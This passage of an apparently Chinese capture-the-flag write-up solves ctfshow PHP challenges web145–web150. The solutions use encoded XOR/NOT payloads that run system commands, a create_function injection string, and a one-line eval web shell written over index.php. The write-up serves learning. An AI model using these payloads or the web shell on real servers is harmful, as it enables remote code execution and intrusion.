<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">check</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">strlen</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">)===</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">?</span><span style="color:#569cd6">true</span><span style="color:#d4d4d4">:</span><span style="color:#569cd6">false</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这个题……没啥变化其实。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">?v1=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v3=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v2=*(</span><span style="color:#ce9178">"%0c%06%0c%0b%05%0d"</span><span style="color:#d4d4d4">^</span><span style="color:#ce9178">"%7f%7f%7f%7f%60%60"</span><span style="color:#d4d4d4">)(</span><span style="color:#ce9178">"%0b%01%03%00%06%00"</span><span style="color:#d4d4d4">^</span><span style="color:#ce9178">"%7f%60%60%20%60%2a"</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### web145（或运算或者取反+三目运算）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/[a-z]|[0-9]|</span><span style="color:#d7ba7d">\@</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\!</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\+</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\-</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\_</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\$</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\}</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\%</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&amp;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&lt;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&gt;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\/</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'get out hacker!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4"> =  </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"return </span><span style="color:#9cdcfe">$v1$v3$v2</span><span style="color:#ce9178">;"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#9cdcfe">$v1$v3$v2</span><span style="color:#ce9178"> = "</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这里没有过滤或运算和取反运算，这两种都可以，主要是考虑怎么链接这三个变量。仔细审查正则可以知道没有过滤问号，而v1又是纯数字，那么可以巧合的构造出：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">?v3:v2</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">其中v3为命令</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">?v1=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v2=</span><span style="color:#b5cea8">2</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v3=?(~%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">C%</span><span style="color:#b5cea8">86</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">C%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">B%</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">A%</span><span style="color:#b5cea8">92</span><span style="color:#d4d4d4">)(~%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">B%</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">E%</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">C%DF%</span><span style="color:#b5cea8">99</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">93</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">E%</span><span style="color:#b5cea8">98</span><span style="color:#d4d4d4">%D1%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">F%</span><span style="color:#b5cea8">97</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">F):</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### web146（取反+或）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/[a-z]|[0-9]|</span><span style="color:#d7ba7d">\@</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\!</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\:</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\+</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\-</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\_</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\$</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\}</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\%</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&amp;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&lt;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&gt;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\/</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'get out hacker!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4"> =  </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"return </span><span style="color:#9cdcfe">$v1$v3$v2</span><span style="color:#ce9178">;"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#9cdcfe">$v1$v3$v2</span><span style="color:#ce9178"> = "</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">过滤了异或也过滤了：不能用三目运算符了。但是没过滤或和取反，不知道我这样算不算非预期：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">?v1=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v2=</span><span style="color:#b5cea8">2</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v3=|(~%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">C%</span><span style="color:#b5cea8">86</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">C%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">B%</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">A%</span><span style="color:#b5cea8">92</span><span style="color:#d4d4d4">)(~%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">B%</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">E%</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">C%DF%</span><span style="color:#b5cea8">99</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">93</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">E%</span><span style="color:#b5cea8">98</span><span style="color:#d4d4d4">%D1%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">F%</span><span style="color:#b5cea8">97</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">F)|</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### ***web147（create_function() 代码注入）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'ctf'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$ctfshow</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'ctf'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d4d4d4">^</span><span style="color:#d16969">[a-z0-9_]</span><span style="color:#d4d4d4">*$</span><span style="color:#d16969">/isD'</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$ctfshow</span><span style="color:#d4d4d4">)) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$ctfshow</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">''</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'show'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这里这个模式匹配中的大写D是什么不认识，特意查了下：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">&gt; 修正符:D 如果使用</span><span style="color:#9cdcfe">$限制结尾字符</span><span style="color:#ce9178">,则不允许结尾有换行;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">本题的正则匹配的是开头包含数字字母下划线的字符，可以用php默认命名空间（\）来绕过。我个菜鸡具体的还是不太懂，先放个Lazzaro佬的解释图：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">![image-20221231080121283](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212310801388.png)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">佬的参考地址：[Code-Breaking Puzzles 题解&amp;学习篇](https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-题解-学习篇/#function)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">**Lazzaro佬**这篇php绕过的含金量也很高，推荐啃：[PHP绕过](https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/index.html)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">正则的事解决之后，看题中的括号内，GET前面是有一个逗号的，也就是说有两个参数，且第一个参数为空是不可控的。这里就要找一个能不用第一个参数的函数且这个函数又能让我们RCE，就比如：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">create_function()主要用来创建匿名函数。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#569cd6">string</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">create_function</span><span style="color:#d4d4d4">    ( </span><span style="color:#569cd6">string</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$args</span><span style="color:#d4d4d4">   , </span><span style="color:#569cd6">string</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4">   )</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">/*</span></span>
<span class="line"><span style="color:#6a9955">    string $args 变量部分</span></span>
<span class="line"><span style="color:#6a9955">	string $code 方法代码部分</span></span>
<span class="line"><span style="color:#6a9955">    */</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">例如：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#dcdcaa">create_function</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'$name'</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">'echo $name."Zhang"'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">类似于：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">fT</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$name</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$fname</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"Zhang"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">于是：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#6a9955"># POST:</span></span>
<span class="line"><span style="color:#d4d4d4">ctf=\create_function</span></span>
<span class="line"><span style="color:#6a9955"># GET:</span></span>
<span class="line"><span style="color:#d4d4d4">?show=}</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'ls'</span><span style="color:#d4d4d4">);</span><span style="color:#6a9955">/*  </span></span>
<span class="line"><span style="color:#6a9955">// } 用来闭合函数体，使得system()跳出函数体得以执行，记得注释掉多余的括号</span></span>
<span class="line"><span style="color:#6a9955">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">### web148（异或rce绕过）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">```php</span></span>
<span class="line"><span style="color:#6a9955">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">include 'flag.php';</span></span>
<span class="line"><span style="color:#6a9955">if(isset($_GET['code'])){</span></span>
<span class="line"><span style="color:#6a9955">    $code=$_GET['code'];</span></span>
<span class="line"><span style="color:#6a9955">    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/",$code)){</span></span>
<span class="line"><span style="color:#6a9955">        die("error");</span></span>
<span class="line"><span style="color:#6a9955">    }</span></span>
<span class="line"><span style="color:#6a9955">    @eval($code);</span></span>
<span class="line"><span style="color:#6a9955">}</span></span>
<span class="line"><span style="color:#6a9955">else{</span></span>
<span class="line"><span style="color:#6a9955">    highlight_file(__FILE__);</span></span>
<span class="line"><span style="color:#6a9955">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">function get_ctfshow_fl0g(){</span></span>
<span class="line"><span style="color:#6a9955">    echo file_get_contents("flag.php");</span></span>
<span class="line"><span style="color:#6a9955">}</span></span>
<span class="line"><span style="color:#6a9955">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">没过滤异或，可以用异或进行rce，脚本前面都有。本地运行中，正则转义方面应修改为：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">```php</span></span>
<span class="line"><span style="color:#6a9955">$preg = '/[A-Za-z0-9_%\\\|~\',.:@&amp;*+\- ]+/';</span></span>
<span class="line"><span style="color:#6a9955">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">payload：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">```php</span></span>
<span class="line"><span style="color:#6a9955">?code=("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%09%01%03%01%06%0c%01%07%01%0b%08%0b"^"%7d%60%60%21%60%60%60%60%2f%7b%60%7b");</span></span>
<span class="line"><span style="color:#6a9955">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">### web149（条件竞争）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">题目描述：你写的快还是我删的快？</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">```php</span></span>
<span class="line"><span style="color:#6a9955">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">error_reporting(0);</span></span>
<span class="line"><span style="color:#6a9955">highlight_file(__FILE__);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">$files = scandir('./'); </span></span>
<span class="line"><span style="color:#6a9955">foreach($files as $file) {</span></span>
<span class="line"><span style="color:#6a9955">    if(is_file($file)){</span></span>
<span class="line"><span style="color:#6a9955">        if ($file !== "index.php") {</span></span>
<span class="line"><span style="color:#6a9955">            unlink($file);</span></span>
<span class="line"><span style="color:#6a9955">        }</span></span>
<span class="line"><span style="color:#6a9955">    }</span></span>
<span class="line"><span style="color:#6a9955">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">file_put_contents($_GET['ctf'], $_POST['show']);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">$files = scandir('./'); </span></span>
<span class="line"><span style="color:#6a9955">foreach($files as $file) {</span></span>
<span class="line"><span style="color:#6a9955">    if(is_file($file)){</span></span>
<span class="line"><span style="color:#6a9955">        if ($file !== "index.php") {</span></span>
<span class="line"><span style="color:#6a9955">            unlink($file);</span></span>
<span class="line"><span style="color:#6a9955">        }</span></span>
<span class="line"><span style="color:#6a9955">    }</span></span>
<span class="line"><span style="color:#6a9955">}</span></span>
<span class="line"><span style="color:#6a9955">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">unlink是Linux系统下删除文件的。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">根据题目描述应该是条件竞争，但是仔细审查代码会发现，可以直接写index.php文件</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">非预期：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">```php</span></span>
<span class="line"><span style="color:#6a9955"># GET:</span></span>
<span class="line"><span style="color:#6a9955">?ctf=index.php</span></span>
<span class="line"><span style="color:#6a9955"># POST:</span></span>
<span class="line"><span style="color:#6a9955">show=&lt;?php @eval($_POST[1]);?&gt;</span></span></code></pre></div></div></figure><p>预期解的话，开 burpsuite 一个不断访问并传参，一个不断访问所写文件</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?ctf=a</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">show=&lt;?php </span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac /c*'</span><span style="color:#d4d4d4">)?&gt;</span></span></code></pre></div></div></figure><h3 id="web150包含日志文件"><a class="markdownIt-Anchor" href="#web150包含日志文件"></a> web150（包含日志文件）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
